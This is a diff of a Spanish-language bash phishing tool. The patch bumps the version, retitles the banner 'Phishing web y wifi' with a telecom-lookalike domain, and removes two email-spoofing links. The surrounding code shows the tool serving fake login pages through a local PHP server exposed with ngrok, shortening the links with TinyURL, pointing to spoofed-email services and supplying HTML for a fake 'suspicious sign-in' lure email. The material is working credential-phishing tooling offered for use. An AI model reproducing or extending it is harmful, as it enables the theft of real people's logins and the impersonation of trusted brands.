@@ -238,13 +238,13 @@ printf "    .-----.----.----.-----.----.   |   Y   |   _   |   Y   |      \n"
 printf "    |  -__|   _|   _|  _  |   _|   |   |   |.  |   |   |   |     \n"
 printf "    |_____|__| |__| |_____|__|     |____   |.  |   |____   |     \n"
 printf "                                       |:  |:  1   |   |:  |    \n"
-printf "     \e[0m\e[1;77m V1.0.30    \e[1;31m                |::.|::.. . |   |::.|    \n"
+printf "     \e[0m\e[1;77m V1.0.31    \e[1;31m                |::.|::.. . |   |::.|    \n"
 printf "                                        --- -------     ---     \n"
                                           
 printf "\n"
 printf "\e[1;77m       ...............\e[0m\e[1;93m JAIME ANDRES MATEUS\e[0m\e[1;77m..............\e[0m\n" 
-printf "\e[1;77m       .............\e[0m\e[1;93m Phishing facil de usar \e[0m\e[1;77m.............\e[0m\n"                              
-printf "\e[1;93m       .....\e[0m\e[1;92m Porque el conocimiento debe ser libre\e[0m \e[1;93m......\e[0m\n"
+printf "\e[1;77m       ................\e[0m\e[1;93m Phishing web y wifi \e[0m\e[1;77m............\e[0m\n"                              
+printf "\e[1;93m       ..................\e[0m\e[1;92m wifimovistar.com\e[0m \e[1;93m.............\e[0m\n"
 printf "\n"
 
 }
@@ -368,8 +368,6 @@ send_ip=$(curl -s https://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] o puedes usar Tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\e[1;77m....\e[0m\e[1;93m Tambien puedes enviar Email Spoof en los siguientes enlaces:\e[0m\e[1;77m...\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://emaildepruebas.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] https://pruebaemailspoof.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] https://unavezmasemail.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
 printf "\e[0m\e[1;93m Tambien puedes enviar Email con este codigo\e[0m\e[1;77m\n"
 printf "\e[1;92m  <h1>Inicio de Session Indebido</h1> \e[0m\n"
 printf "\e[1;92m  <h3>Hemos notado una actividad sospechoza en tu cuenta</h3> \e[0m\n"
@@ -417,8 +415,8 @@ if [[ -e ngrok ]]; then
 echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "Necesita unzip pero no está instalado. Instalarlo. Saliendo."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "Necesita wget pero no está instalado. Instalarlo. Saliendo."; exit 1; }
-printf "\e[1;92m[\e[0m*\e[1;92m] Descargando Ngrok...\n"
+command -v wget > /dev/null 2>&1 || { echo >&2 "Necesita wget pero no está instalado, (pkg install wget)."; exit 1; }
+printf "\e[1;92m[\e[0m*\e[1;92m] Descargando Ngrok de nube...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
@@ -452,7 +450,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Comienza el servidor PHP...\n"
 cd sites/$server && php -S 127.0.0.1:4040 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Comienza el servidor con Ngrok...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
+./ngrok http 3000 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
